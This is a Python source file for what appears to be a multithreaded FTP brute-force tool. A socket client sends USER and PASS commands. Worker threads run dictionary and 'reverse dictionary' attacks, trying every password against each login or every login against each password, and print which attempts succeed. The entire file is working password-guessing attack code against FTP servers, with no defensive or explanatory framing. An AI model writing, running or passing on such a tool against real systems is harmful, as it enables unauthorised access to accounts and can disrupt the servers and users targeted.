import socket
from queue import Queue
from config import *
import threading
import time
import sys



### PRINT LOCK ###
print_lock = threading.Lock()
### END PRINT LOCK ###


class Client:
	def __init__(self, host = '', port = 21):
		self.__host = socket.gethostbyname(host)
		self.__port = port
		self.__attempts_counter = 0

		# True of login attempt is successful
		self.__success = False


	def connect(self):
		self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.__sock.connect((self.__host, self.__port))
		welcome_message = self.__sock.recv(CHUNK_SIZE)
		response_code = welcome_message[:3]
		if response_code.decode() != FTP_CONNECTION_SUCCESS:
			print(CONNECTION_ERROR)
			exit(1)


	def __check_connection(self):
		if self.__attempts_counter == ATTEMPTS_LIMIT:
			self.connect()
			self.__attempts_counter = 0


	def __format_user_input(self, input):
		return input.replace('\r', '').replace('\n', '')


	def send_login(self, login):
		self.__check_connection()
		login = self.__format_user_input(login)
		self.__sock.send(str.encode(FTP_USERNAME_CMD.format(login)))
		self.__attempts_counter += 1
		response = self.__sock.recv(CHUNK_SIZE)
		response_code = response[:3]
		self.__success = (response_code.decode() == FTP_LOGIN_SUCCESS)


	def send_password(self, password):
		password = self.__format_user_input(password)
		self.__sock.send(str.encode(FTP_PASSWORD_CMD.format(password)))
		response = self.__sock.recv(CHUNK_SIZE)
		response_code = response[:3]
		self.__success = (response_code.decode() == FTP_LOGIN_SUCCESS)


	def get_attempt_success(self):
		return self.__success

	def close_connection(self):
		self.__sock.close()


def login_attempt(target, login, password):
	time.sleep(DELAY)
	target.send_login(login)
	target.send_password(password)
	result = target.get_attempt_success()
	if result:
		return SUCCESS
	else:
		return FAILURE


def dict_attack(target_client, queue, password_list):
	"""
	 Dictionary attack of target url based on
	 default brute force (try all password for every login)
	 e.g. login:pass1, login:pass2, login:pass3 etc.
	"""
	while True:
		login = queue.get()
		for passwd in password_list:
			result = login_attempt(target_client, login, passwd)
			with print_lock:
				print(LOGIN_ATTEMPT.format(result, login, passwd))
		queue.task_done()


def reverse_dict_attack(target_client, login_list, queue):
	while True:
		password = queue.get()
		for login in login_list:
			result = login_attempt(target_client, login, password)
			with print_lock:
				print(LOGIN_ATTEMPT.format(result, login, password))
		queue.task_done()



def brute_force(host
				, port
				, logins
				, passwords
				, num_threads
				, reverse = False):

	queue = Queue()

	# List of created Target classes
	clients = []

	if reverse == False:

		for login in logins:
			queue.put(login)

		for thread_counter in range(num_threads):

			# Creating client with socket for each thread
			client_per_thread = Client(host, port)
			client_per_thread.connect()
			clients.append(client_per_thread)
			thrd = threading.Thread(target = dict_attack
                                    , args = (client_per_thread, queue, passwords))
			thrd.daemon = True
			thrd.start()
	else:
		for passwd in passwords:
				queue.put(passwd)
		for thread_counter in range(num_threads):
			client_per_thread = Client(host, port)
			client_per_thread.connect()
			thrd = threading.Thread(target = reverse_dict_attack
                                    , args = (client_per_thread, logins, queue))
			thrd.daemon = True
			thrd.start()

	queue.join()
